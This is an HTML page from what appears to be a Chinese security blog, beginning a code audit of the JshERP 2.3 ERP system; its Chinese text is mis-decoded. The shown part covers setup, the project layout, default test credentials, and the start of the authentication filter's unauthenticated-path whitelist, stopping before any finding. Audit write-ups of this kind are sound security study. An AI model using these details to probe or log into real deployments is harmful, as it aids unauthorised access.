

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
  <meta name="author" content="Xvsf">
  <meta name="keywords" content="">
  
    <meta name="description" content="åå¤ERP 2.3 ä»£ç å®¡è®¡">
<meta property="og:type" content="article">
<meta property="og:title" content="åå¤ERP 2.3 ä»£ç å®¡è®¡">
<meta property="og:url" content="http://xvshifu.github.io/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="Xvsf blogs">
<meta property="og:description" content="åå¤ERP 2.3 ä»£ç å®¡è®¡">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/52403351/1755660382217-6998767d-c701-40dc-b102-1ac471e6c34e.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png">
<meta property="article:published_time" content="2025-08-20T06:00:00.000Z">
<meta property="article:modified_time" content="2025-08-28T03:02:11.016Z">
<meta property="article:author" content="Xvsf">
<meta property="article:tag" content="Java ä»£ç å®¡è®¡">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>åå¤ERP 2.3 ä»£ç å®¡è®¡ - Xvsf blogs</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/xm_custom/custom.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 8.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ–‹ï¸ Hello My Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="åå¤ERP 2.3 ä»£ç å®¡è®¡"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-08-20 14:00" pubdate>
          2025å¹´8æœˆ20æ—¥ ä¸‹åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.4k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          37 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">åå¤ERP 2.3 ä»£ç å®¡è®¡</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äº 2025å¹´8æœˆ28æ—¥ ä¸Šåˆ
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>é¡¹ç›®åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/jishenghua/jshERP/releases/tag/2.3">https://github.com/jishenghua/jshERP/releases/tag/2.3</a></p>
<h1 id="ç¯å¢ƒæ­å»ºï¼š"><a href="#ç¯å¢ƒæ­å»ºï¼š" class="headerlink" title="ç¯å¢ƒæ­å»ºï¼š"></a>ç¯å¢ƒæ­å»ºï¼š</h1><p>MySQL 5.7.26ï¼ŒIDEAï¼ŒMaven 3.9.1ï¼ŒJDK 1.8ï¼Œ </p>
<p>æ•°æ®åº“æ–°å»ºjsh_erpæ•°æ®åº“ï¼Œå¯¼å…¥sqlæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png" srcset="/img/loading.gif" lazyload>IDEA çš„ JDK ç‰ˆæœ¬åˆ‡æ¢ä¸º1.8</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png" srcset="/img/loading.gif" lazyload></p>
<p>Mavenæ„å»º</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿è¡Œ ErpApplication.java å¯åŠ¨ç¨‹åº</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="ç›®å½•åˆ†æ"><a href="#ç›®å½•åˆ†æ" class="headerlink" title="ç›®å½•åˆ†æ"></a>ç›®å½•åˆ†æ</h1><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™ä¸ªé¡¹ç›®çš„ç»“æ„æ›´åƒæ˜¯ MVC æ¶æ„ï¼ˆ Mapper&#x2F;MapperXMLï¼› Controller  ï¼‰ï¼Œåˆå¢åŠ äº†  Service å±‚ ã€‚</p>
<ul>
<li>Maven Assembly æ’ä»¶ï¼Œç”¨äºå¸®åŠ©æ‰“åŒ…ï¼› assembly.xml  æ˜¯æ‰“åŒ…çš„é…ç½®æ–‡ä»¶</li>
<li>bin ä¸­çš„æ–‡ä»¶éƒ½æ˜¯ jshERP çš„è¿è¡Œè„šæœ¬</li>
<li>resources&#x2F;mapper_xmlï¼š MyBatis æ¡†æ¶çš„ SQL æ˜ å°„é…ç½®æ–‡ä»¶ï¼Œ â€œæ•°æ®åº“æ“ä½œè¯´æ˜ä¹¦â€  </li>
<li>logback-spring.xmlï¼šæ—¥å¿—æ–‡ä»¶è¾“å‡ºé…ç½®</li>
<li>java<ul>
<li>config<ul>
<li><font style="color:#080808;background-color:#ffffff;">PluginBeanConfig.java  æ’ä»¶ç®¡ç†å™¨ Bean</font></li>
<li><font style="color:#080808;background-color:#ffffff;">PluginConfiguration.java  é…ç½®æ’ä»¶ç³»ç»Ÿçš„è¿è¡Œç¯å¢ƒå’Œå‚æ•°  </font></li>
<li><font style="color:#080808;background-color:#ffffff;"> Swagger2Config.java      ç”¨äºç”Ÿæˆ RESTful API æ–‡æ¡£ , æä¾›æ–‡æ¡£å…ƒä¿¡æ¯  </font></li>
<li><font style="color:#080808;background-color:#ffffff;"> TenantConfig.java  é¡¹ç›®æ•°æ®åº“è®¿é—®çš„</font>ç»Ÿä¸€æ‹¦æˆªå™¨å’Œæ’ä»¶é…ç½®ä¸­å¿ƒ</li>
<li>WebConfig.java æŒ‡å®šå‰ç«¯é™æ€æ–‡ä»¶å­˜æ”¾ä½ç½®ï¼Œ åœ¨ Spring Boot å†…ç½® Web æœåŠ¡å™¨ä¸­ç”Ÿæ•ˆ</li>
</ul>
</li>
<li>constants     <ul>
<li>BusinessConstants  <font style="color:#080808;background-color:#ffffff;">ä¸šåŠ¡å­—å…¸ç±»</font></li>
<li><font style="color:#080808;background-color:#ffffff;"> ExceptionConstants    å¼‚å¸¸ä¸è¿”å›ç ç®¡ç†ç±»  </font></li>
</ul>
</li>
<li>controller      Web å±‚æ¥å£  </li>
<li>datasource      æ•°æ®æºå’Œæ•°æ®åº“è®¿é—®é…ç½®  </li>
<li>exception    å¼‚å¸¸å¤„ç†  </li>
<li>filter<ul>
<li>LogCostFilter   è‡ªå®šä¹‰ Servlet è¿‡æ»¤å™¨ï¼Œ æ§åˆ¶ç”¨æˆ·è®¿é—®æƒé™å’Œç™»å½•è¯·æ±‚å¤„ç†</li>
</ul>
</li>
<li>service     ä¸šåŠ¡é€»è¾‘å±‚  </li>
<li>utils    å·¥å…·ç±»  </li>
<li>ErpApplication.java    å…¥å£ç±»ï¼Œå‚è€ƒ<a target="_blank" rel="noopener" href="https://www.yuque.com/taohuayuanpang/kfw7zl/cqdlt0kgwyh524ay#vrt3I">SpringBoot-æ³¨è§£ @SpringBootApplication åˆ†æ</a></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å£°æ˜ springbootï¼Œç»„åˆäº†@SpringBootConfiguration @EnableAutoConfiguration @ComponentScann</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-comment">//MyBatis Mapper æ¥å£æ‰«æè·¯å¾„</span><br><span class="hljs-meta">@MapperScan(&quot;com.jsh.erp.datasource.mappers&quot;)</span><br><span class="hljs-meta">@ServletComponentScan</span><br><span class="hljs-meta">@EnableScheduling</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErpApplication</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(ErpApplication.class, args);<br>        <span class="hljs-type">Environment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> context.getBean(Environment.class);<br>        System.out.println(<span class="hljs-string">&quot;å¯åŠ¨æˆåŠŸï¼Œè®¿é—®åœ°å€ï¼šhttp://&quot;</span> + ComputerInfo.getIpAddr() + <span class="hljs-string">&quot;:&quot;</span><br>                           + environment.getProperty(<span class="hljs-string">&quot;server.port&quot;</span>) + <span class="hljs-string">&quot;ï¼Œæµ‹è¯•ç”¨æˆ·ï¼šjshï¼Œå¯†ç ï¼š123456&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><h2 id="1ã€LogCostFilter-java"><a href="#1ã€LogCostFilter-java" class="headerlink" title="1ã€LogCostFilter.java"></a>1ã€LogCostFilter.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsh.erp.filter;<br><br><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebInitParam;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-meta">@WebFilter(</span><br><span class="hljs-meta">    filterName = &quot;LogCostFilter&quot;,</span><br><span class="hljs-meta">    //è¿‡æ»¤å™¨å¯¹æ‰€æœ‰è·¯å¾„éƒ½ç”Ÿæ•ˆ</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">    initParams = &#123;</span><br><span class="hljs-meta">        //è¦å¿½ç•¥çš„é™æ€èµ„æº</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">        //å…è®¸æœªç™»å½•è®¿é—®çš„è·¯å¾„</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;filterPath&quot;, value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)</span><br><span class="hljs-meta">    &#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCostFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filterPath&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IGNORED_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ignoredUrl&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ignoredList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> String[] allowUrls;<br>    <span class="hljs-keyword">private</span> String[] ignoredUrls;<br><br>    <span class="hljs-comment">//å°† filterPath å’Œ ignoredUrl è§£ææˆ allowUrls å’Œ ignoredListï¼ˆç™½åå•ï¼‰ï¼Œç”¨äºåç»­ doFilter åˆ¤æ–­</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(FILTER_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;<br>            allowUrls = filterPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? filterPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span 